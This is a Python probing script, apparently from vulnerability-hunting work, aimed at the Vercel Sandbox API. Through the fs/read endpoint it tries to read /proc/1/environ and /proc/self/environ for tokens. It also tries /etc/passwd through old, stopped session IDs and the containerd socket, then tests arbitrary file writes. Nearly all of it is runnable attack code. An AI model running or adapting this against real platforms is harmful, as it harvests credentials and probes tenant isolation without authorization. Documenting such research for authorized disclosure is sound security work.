# -*- coding: utf-8 -*-
"""fs/read 面续: environ 完整内容 + 旧会话生命周期 + 已删除沙箱
F1: /proc/1/environ 完整 (token?)
F2: 旧 sid (已停止会话) fs/read -> 生命周期
F3: 删除的沙箱 sid fs/read
F4: /proc/self/environ, /vercel/bin, docker socket
F5: fs/write 写面
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def fs_read(sess, path, tag=''):
    body = {"path": path}
    c, r = api('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sess, TEAM), body)
    content = r if isinstance(r, str) else str(r)
    print('[%s] http=%s len=%d | %s' % (tag, c, len(content), content[:250].replace(chr(10), ' ')), flush=True)
    return c, content

# F1: 完整 environ
fs_read(sid, '/proc/1/environ', 'F1-environ')

# F2: 旧 sid (之前已停止的会话)
old_sids = ['sbx_D6Im4ndAmPcHcThOnhiwpMp32Fnt', 'sbx_YrJ5hvaAU9gVgwU9nBdPOg7hgUIh']
for osid in old_sids:
    fs_read(osid, '/etc/passwd', 'F2-old-%s' % osid[-6:])

# F4: 其他敏感路径
fs_read(sid, '/proc/self/environ', 'F4-self-environ')
fs_read(sid, '/run/containerd/containerd.sock', 'F4-containerd')

# F5: fs/write 写面
c, r = api('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM),
           {"path": "/tmp/fswrite_test.txt", "data": "hello_fs_write_2026"})
print('[F5-write] http=%s | %s' % (c, (r if isinstance(r, str) else str(r))[:200]), flush=True)

# F5b: 读回
fs_read(sid, '/tmp/fswrite_test.txt', 'F5b-readback')

print('=== FS2 DONE ===', flush=True)
